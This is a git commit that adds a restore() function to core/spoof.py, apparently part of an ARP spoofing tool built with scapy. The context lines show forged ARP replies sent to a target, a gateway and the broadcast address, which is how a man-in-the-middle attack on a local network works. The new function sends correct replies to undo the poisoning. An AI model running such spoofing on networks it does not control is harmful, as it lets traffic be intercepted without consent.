b0353cf103c8a136d0f8822802f97f4dbd587bed
isitAlo <alneami327@gmail.com>
2026-05-07 05:58:40 +0300

    Update spoof.py

--- core/spoof.py
+++ core/spoof.py
@@ -11,3 +11,10 @@ def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
     g_pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
     b_pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip)
     scapy.sendp([t_pkt, g_pkt, b_pkt], verbose=False)
+
+def restore(target_ip, gateway_ip):
+    t_mac, _ = get_device_info(target_ip)
+    g_mac, _ = get_device_info(gateway_ip)
+    if t_mac and g_mac:
+        pkt = scapy.Ether(dst=t_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=t_mac, psrc=gateway_ip, hwsrc=g_mac)
+        scapy.sendp(pkt, count=5, verbose=False)
